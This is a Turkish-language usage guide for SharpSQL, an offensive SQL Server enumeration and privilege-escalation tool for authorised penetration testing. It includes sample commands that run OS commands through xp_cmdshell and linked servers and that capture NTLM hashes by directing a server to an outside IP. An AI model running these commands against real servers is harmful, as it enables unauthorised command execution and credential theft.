# SharpSQL Kullanım Rehberi

## SharpSQL Nedir?

**SharpSQL**, PowerUpSQL aracının C# ile geliştirilmiş basit bir sürümüdür. SQL Server ortamlarını keşfetmek, yönetmek ve potansiyel güvenlik açıklarını test etmek için kullanılır. Aracın sunduğu işlevler, SQL sunucularını analiz etmeyi ve yetki yükseltme saldırılarını gerçekleştirmeyi kolaylaştırır.

> **Önemli Not:** SharpSQL yalnızca yetkili test ortamlarında ve etik kullanım amaçlı çalıştırılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Özellikler

1. **SQL Sunucu Keşfi:**
   - Domain içindeki SQL sunucularını tespit eder.
2. **SQL Yönetimi:**
   - SQL kullanıcılarını, gruplarını ve izinlerini analiz eder.
3. **Yetki Yükseltme:**
   - Komut yürütme ve impersonation yöntemleriyle yetki yükseltme saldırılarını gerçekleştirir.

---

## İndirme ve Çalıştırma

SharpSQL aracı GitHub üzerinden sağlanabilir:

- [SharpSQL GitHub Sayfası](https://github.com/mlcsec/SharpSQL)

### Çalıştırma Adımları

1. **Araç Dosyasını İndirin:**
   ```bash
   git clone https://github.com/mlcsec/SharpSQL.git
   ```

2. **Derleme:**
   - Visual Studio kullanarak projeyi açın ve derleyin.
   - Derleme sonucunda `SharpSQL.exe` dosyasını elde edeceksiniz.

3. **Çalıştırma:**
   ```bash
   SharpSQL.exe [Metot] [Parametreler]
   ```

---

## Kullanım Parametreleri

### Genel Kullanım
```bash
SharpSQL.exe [Metot] [Parametreler]
```

### Desteklenen Metotlar
- **Get-SQLInstanceDomain:** Domain içindeki SQL sunucularını keşfeder.
- **Get-Databases:** Mevcut veritabanlarını listeler.
- **Get-Sysadmins:** SQL sunucusundaki sysadmin kullanıcılarını listeler.
- **Invoke-OSCmd:** `xp_cmdshell` kullanarak komut çalıştırır.
- **Get-Hash:** NTLM hash değerlerini toplar.

### Ortak Parametreler
- **-Instance:** Hedef SQL sunucusunun adı veya IP adresi.
- **-Command:** Çalıştırılacak komut (varsayılan: `whoami`).
- **-Query:** Çalıştırılacak SQL sorgusu.
- **-User:** Kullanıcı adı.
- **-db:** Bağlanılacak veritabanı (varsayılan: `master`).

---

## Örnek Kullanım Senaryoları

### SQL Sunucularını Keşfetme
```bash
SharpSQL.exe Get-SQLInstanceDomain
```

### Kullanıcı İzinlerini Görüntüleme
```bash
SharpSQL.exe Get-UserPrivs -Instance sql.server
```

### `xp_cmdshell` ile Komut Çalıştırma
```bash
SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command "whoami"
```

### NTLM Hash Toplama
```bash
SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
```

### Linked Server Üzerinden Komut Çalıştırma
```bash
SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command "dir C:\\users\\"
```

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** SharpSQL yalnızca güvenlik uzmanları ve yetkili sistem yöneticileri tarafından kullanılmalıdır.
- **Test Ortamı:** Araç üretim ortamında kullanılmadan önce test ortamında değerlendirilmelidir.
- **Loglama:** Çalıştırılan komutlar sistem loglarına kaydedilebilir. Yasalara uygun hareket edilmelidir.

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
